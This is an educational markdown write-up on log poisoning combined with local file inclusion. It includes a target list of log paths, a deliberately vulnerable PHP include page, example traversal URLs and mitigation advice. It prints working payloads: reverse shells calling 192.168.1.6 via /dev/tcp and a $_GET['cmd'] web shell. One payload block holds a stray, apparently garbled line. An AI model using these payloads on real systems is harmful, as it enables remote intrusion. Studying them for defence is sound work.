# 🔒 Log Poisoning Vulnerability

## 📋 Overview

**Log Poisoning** is a sophisticated web application attack where malicious input is injected into application or server log files (such as Apache access/error logs) with the intent of later executing this input as code, typically by exploiting a Local File Inclusion (LFI) vulnerability.

---

## 🎯 Attack Mechanism

### Primary Attack Vector

Attackers inject **PHP code** into logs via HTTP headers (like User-Agent), then trigger the code by including the poisoned log file in a PHP context.

### Attack Flow

```
1. Inject malicious code → Log files
2. Exploit LFI vulnerability → Include poisoned log
3. Execute injected code → Remote Code Execution (RCE)
```

---

## 📁 Common Log File Targets

Attackers may attempt to poison the following system log files:

|#|Log File Path|
|---|---|
|1|`/var/log/apache/access.log`|
|2|`/var/log/apache/error.log`|
|3|`/var/log/apache2/access.log`|
|4|`/var/log/apache2/error.log`|
|5|`/var/log/nginx/access.log`|
|6|`/var/log/nginx/error.log`|
|7|`/var/log/vsftpd.log`|
|8|`/var/log/sshd.log`|
|9|`/var/log/mail`|
|10|`/var/log/httpd/error_log`|
|11|`/usr/local/apache/log/error_log`|
|12|`/usr/local/apache2/log/error_log`|
|13|`/var/log/auth.log`|
|14|`/var/log/kern.log`|
|15|`/var/log/user.log`|
|16|`/var/log/apt/term.log`|
|17|`/var/log/apt/history.log`|
|18|`/var/log/apache2/other_vhosts_access.log`|
|19|`/var/log/apache2/access.log`|
|20|`/var/log/apache2/error.log`|
|21|`/var/log/fontconfig.log`|
|22|`/var/log/dpkg.log`|
|23|`/var/log/installer/Xorg.0.log`|
|24|`/var/log/daemon.log`|
|25|`/var/log/alternatives.log`|
|26|`/var/log/mysql/error.log`|
|27|`/run/initramfs/fsck.log`|

---

## ⚠️ Risk Factors

### File Permission Vulnerabilities

```bash
chmod 777 <logfile>
```

Files with permissions like `chmod 777` become **writable or world-readable**, dramatically increasing exploitation risk.

---

## 💻 Sample Vulnerable PHP Code

**Filename:** `local-file-inclusion3.php`

```php
<!DOCTYPE html>
<html>
<head>
    <title>Local File Inclusion</title>
</head>
<body>
<h1>Local File Inclusion</h1>
<?php
if (isset($_REQUEST["file"])) {
    $local_file = "log/" . $_REQUEST["file"] . ".log";
    include($local_file);
}
?>
</body>
</html>
```

### Vulnerability Analysis

- **Line 9-10:** Accepts user input via `$_REQUEST["file"]`
- **Line 10:** Constructs file path with user-controlled input
- **Line 11:** Uses `include()` to execute the file content
- **No input validation or sanitization**

---

## 🚀 Attacker Payloads

### Log File Poisoning Techniques

Malicious PHP code sent via HTTP headers (e.g., User-Agent) or SSH username:

#### Payload 1: Command Execution with exec()

```php
<?php exec('/bin/bash -c "bash -i >& /dev/tcp/192.168.1.6/443 0>&1"'); ?>
```

#### Payload 2: Command Execution with system()

```php
<?php system('bash -i >& /dev/tcp/192.168.1.6/443 0>&1'); ?>
```

#### Payload 3: Simple Command Injection

```php
<?php echo system($_GET['cmd']); ?>
```

#### Payload 4: Alternative Syntax

```bash
simple_aac_recording0
bash -c 'bash -i >& /dev/tcp/192.168.1.6/443 0>&1'
```

---

## 🔗 Exploitation URLs

### Example Attack Patterns

```
http://target.com/local-file-inclusion3.php?file=../../../var/log/apache2/access
http://target.com/vulnerable.php?page=../../../var/log/nginx/access
http://target.com/index.php?file=../../var/log/auth
```

The attacker:

1. First poisons the log by sending malicious User-Agent
2. Then accesses the vulnerable page with LFI parameter pointing to the poisoned log
3. The PHP code in the log gets executed

---

## 🛡️ Prevention & Mitigation

### Security Best Practices

1. **Input Validation**
    
    - Whitelist allowed file names
    - Sanitize all user inputs
    - Reject path traversal sequences (`../`, `..\\`)
2. **Secure File Permissions**
    
    - Restrict log file permissions (`chmod 640` or `600`)
    - Ensure web server cannot write to sensitive logs
3. **Disable Dangerous Functions**
    
    ```php
    disable_functions = exec,passthru,shell_exec,system,proc_open,popen
    ```
    
4. **Use Absolute Paths**
    
    - Avoid concatenating user input with file paths
    - Use basename() to strip directory components
5. **WAF & Monitoring**
    
    - Deploy Web Application Firewall
    - Monitor logs for suspicious patterns
    - Alert on abnormal User-Agent strings
6. **Principle of Least Privilege**
    
    - Run web server with minimal permissions
    - Separate log directories from web root

---

## 📚 References

- **OWASP:** Local File Inclusion
- **CVE Database:** LFI/RFI Vulnerabilities
- **CWE-98:** Improper Control of Filename for Include/Require Statement

---

> ⚠️ **Disclaimer:** This documentation is for educational purposes only. Unauthorized access to computer systems is illegal.

---

_Document Version: 1.0 | Last Updated: January 2026_